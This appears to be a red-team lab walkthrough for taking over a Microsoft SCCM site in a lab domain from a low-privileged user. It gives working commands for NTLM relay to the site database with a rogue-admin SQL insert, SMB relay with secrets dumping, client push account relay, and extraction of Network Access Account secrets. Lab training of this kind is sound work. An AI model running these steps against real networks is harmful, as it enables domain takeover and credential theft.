# SCCM part 2 - exploit with a low user

Adapts mayfly's SCCM LAB part 0x2. With one low privileged domain user and the
site map from [part 1](part-01-recon-and-pxe.md), coerce the site server into
authenticating and relay that authentication to the site database. The site
server runs as its machine account `MECM$`, which is a sysadmin on the site
database, so relaying it is a full site takeover.

The enumeration and impacket client tooling runs from the Kali over patient
zero's beacon SOCKS (the jumpbox SSH SOCKS is the admin fallback), matching
[part 1](part-01-recon-and-pxe.md). The relay listener is the exception:
`ntlmrelayx` runs on the jumpbox foothold, not down the beacon SOCKS, because it
has to receive the coerced inbound authentication, which a SOCKS proxy cannot
deliver. This is the documented relay exception (see the relay step in
[GOAD part 4](../goad/part-04-poison-and-relay.md)). ntlmrelayx needs a pty, so
run it under `screen -dmS`. It must not bind :80 if nginx already owns it on the
jumpbox; use `--no-http-server` when relevant.

## Takeover 1 - relay to the site database over MSSQL

TAKEOVER-1. Point the site server at the relay, catch its authentication, and
replay it to MSSQL on the database host. mayfly first inserts a rogue RBAC admin
directly:

```
proxychains -q sccmhunter.py mssql -u <user> -p <pass> -d sccm.lab -dc-ip 192.168.56.5 -tu <user> -sc P01 -stacked

screen -dmS relay ntlmrelayx.py -smb2support -ts \
  -t mssql://192.168.56.6 \
  -q "USE CM_P01; INSERT INTO RBAC_Admins (AdminSID,LogonName,IsGroup,SourceSite) VALUES (<sid>,'SCCMLAB\\<user>',0,'P01');"
```

Then coerce MECM$ to authenticate to the relay (PetitPotam or a print/RPC
coercion aimed at the site server). When MECM$ lands on the relay, the queued
query runs against `CM_P01` as a sysadmin and the low user becomes a full SCCM
admin.

## Takeover 2 - relay to the site database over SMB

TAKEOVER-2. Same coercion, relayed over SMB with a SOCKS session instead of a
single query, which gives an interactive foothold as `MECM$`:

```
screen -dmS relay ntlmrelayx.py -smb2support -ts -t 192.168.56.6 -socks
# coerce MECM$ ...
proxychains -q secretsdump.py -no-pass 'SCCMLAB/MECM$'@192.168.56.6
proxychains -q mssqlclient.py -windows-auth -no-pass 'SCCMLAB/MECM$'@192.168.56.6
```

As `MECM$` on the database host you can dump secrets and open an authenticated
MSSQL session, confirming site database control.

## Elevate 2 - relay client push installation

ELEVATE-2. If automatic client push is enabled, the site server pushes the
client to new systems using the client push account, and that push can be
coerced and relayed. Stand up a fake client so the site tries to push to it,
then relay the push account:

```
screen -dmS relay ntlmrelayx.py -t 192.168.56.6 -smb2support -socks
proxychains -q smbexec.py -no-pass SCCMLAB/SCCM-CLIENT-PUSH@192.168.56.6
```

## Cred 2 - policy request, NAA secrets

CRED-2. With a machine account (for example one obtained above, or a computer
account you can create), request client policy from the management point. The
Network Access Account secrets come back in the policy and decrypt to a usable
credential.

```
proxychains -q python3 sccmwtf.py fake fakepc.sccm.lab MECM 'SCCMLAB\<machine>$' '<machine-pass>'
```

## redStackPRO notes to confirm at live run

- **Coercion path.** The GOAD part 4 finding applies: a cloud VPC drops the
  broadcast and multicast that some coercion and poisoning relies on, but
  targeted RPC coercion of a named host (PetitPotam or print bug against
  `192.168.56.3`) does not need broadcast and should work over the pivot.
  Confirm which coercion primitive lands.
- **MECM$ is sysadmin on the DB.** This is exactly what the sccm role sets up
  (MECM$ plus the site admin account granted sysadmin on the site database), so
  TAKEOVER-1 and TAKEOVER-2 should both be reachable.
- **ntlmrelayx dsinternals.** ntlmrelayx crashes without `dsinternals`; ship it
  on the operator toolchain (PZ-2).

## Step results

| step | id | result | notes |
|------|----|--------|-------|
| relay to DB (MSSQL) | TAKEOVER-1 | | |
| relay to DB (SMB) | TAKEOVER-2 | | |
| client push relay | ELEVATE-2 | | needs client push enabled |
| policy NAA secrets | CRED-2 | | needs a machine account |
